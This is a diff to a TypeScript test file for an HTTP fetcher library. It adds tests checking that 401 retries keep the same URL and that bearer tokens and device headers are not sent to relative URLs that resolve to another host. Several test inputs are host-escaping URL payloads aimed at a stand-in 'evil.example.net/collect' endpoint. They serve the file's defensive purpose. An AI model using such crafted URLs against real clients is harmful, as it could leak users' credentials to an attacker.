@@ -32,8 +32,11 @@ const token: CompositeToken = {
 
 let sent: Record<string, Headers>;
 
-function configured(isTrusted?: RequestTrust): Fetcher {
-  const fetcher = new Fetcher({ baseURL: 'https://api.example.com/v1' });
+function configured(
+  isTrusted?: RequestTrust,
+  baseURL = 'https://api.example.com/v1',
+): Fetcher {
+  const fetcher = new Fetcher({ baseURL });
   const tokenStorage = new TokenStorage({
     storage: new InMemoryStorage(),
     eventBus: new SerialTypedEventBus('trust'),
@@ -132,5 +135,102 @@ describe('request trust', () => {
     expect(authorizations).toHaveLength(2);
     expect(authorizations[1]).toMatch(/^Bearer /);
     expect(isTrusted).not.toHaveBeenCalled();
+  });
+
+  // #2009: the 401 retry re-runs the request chain on the same exchange; a
+  // relative baseURL must not be prefixed to the resolved URL again.
+  it.each(['/api', 'api', '/api/'])(
+    'retries a request on the relative baseURL %j at the same URL',
+    async baseURL => {
+      const fetcher = configured(sameOriginTrust, baseURL);
+      const requests: { url: string; authorization: string | null }[] = [];
+      vi.stubGlobal('fetch', async (url: string, init: RequestInit) => {
+        const headers = new Headers(init.headers as HeadersInit);
+        requests.push({ url, authorization: headers.get('authorization') });
+        return new Response('{}', {
+          status: requests.length === 1 ? 401 : 200,
+        });
+      });
+      const response = await fetcher.get('/resource', {
+        urlParams: { query: { limit: 1 } },
+      });
+      expect(response.status).toBe(200);
+      const expected = `${baseURL.replace(/\/+$/, '')}/resource?limit=1`;
+      expect(requests.map(({ url }) => url)).toEqual([expected, expected]);
+      expect(requests[1].authorization).toMatch(/^Bearer /);
+    },
+  );
+
+  // #1995: a relative URL that the URL parser resolves to another host must
+  // not be trusted just because it does not look absolute.
+  describe('with a relative URL that leaves the baseURL host', () => {
+    const escaping = [
+      '\\evil.example.net/collect',
+      '/\\evil.example.net/collect',
+      '\\\\evil.example.net/collect',
+      '\t//evil.example.net/collect',
+      '/\n/evil.example.net/collect',
+    ];
+
+    function expectNoCredentials(headers: Headers) {
+      expect(headers.has('authorization')).toBe(false);
+      expect(headers.has('cosec-device-id')).toBe(false);
+      expect(headers.has('cosec-app-id')).toBe(false);
+    }
+
+    it.each(['', '/api'])(
+      'keeps credentials from it on a page, baseURL %j',
+      async baseURL => {
+        vi.stubGlobal('location', new URL('https://app.example.com/page'));
+        const fetcher = configured(sameOriginTrust, baseURL);
+        await fetcher.get('/users');
+        const own = Object.keys(sent)[0];
+        expect(sent[own].get('authorization')).toMatch(/^Bearer /);
+        for (const url of escaping) {
+          sent = {};
+          await fetcher.get(url);
+          const [requested] = Object.keys(sent);
+          // Native fetch resolves what Fetcher sends to the other host.
+          expect(new URL(requested, location.href).host).toBe(
+            baseURL ? 'app.example.com' : 'evil.example.net',
+          );
+          if (baseURL) {
+            expect(sent[requested].get('authorization')).toMatch(/^Bearer /);
+          } else {
+            expectNoCredentials(sent[requested]);
+          }
+        }
+      },
+    );
+
+    it('keeps credentials from it without a page location', async () => {
+      const fetcher = configured(sameOriginTrust, '');
+      for (const url of escaping) {
+        sent = {};
+        await fetcher.get(url);
+        expectNoCredentials(Object.values(sent)[0]);
+      }
+    });
+
+    it('asks a custom predicate about the URL it resolves to', async () => {
+      vi.stubGlobal('location', new URL('https://app.example.com/page'));
+      const isTrusted = vi.fn(() => false);
+      const fetcher = configured(isTrusted, '');
+      await fetcher.get('/users');
+      await fetcher.get('\\evil.example.net/collect?a=1');
+      expect(isTrusted.mock.calls.map(([url]) => url)).toEqual([
+        'https://evil.example.net/collect?a=1',
+      ]);
+      expectNoCredentials(sent['/\\evil.example.net/collect?a=1']);
+      expect(sent['/users'].get('authorization')).toMatch(/^Bearer /);
+    });
+
+    it('still trusts a URL that stays on an absolute baseURL', async () => {
+      const fetcher = configured(sameOriginTrust);
+      await fetcher.get('\\evil.example.net/collect');
+      const headers =
+        sent['https://api.example.com/v1/\\evil.example.net/collect'];
+      expect(headers.get('authorization')).toMatch(/^Bearer /);
+    });
   });
 });
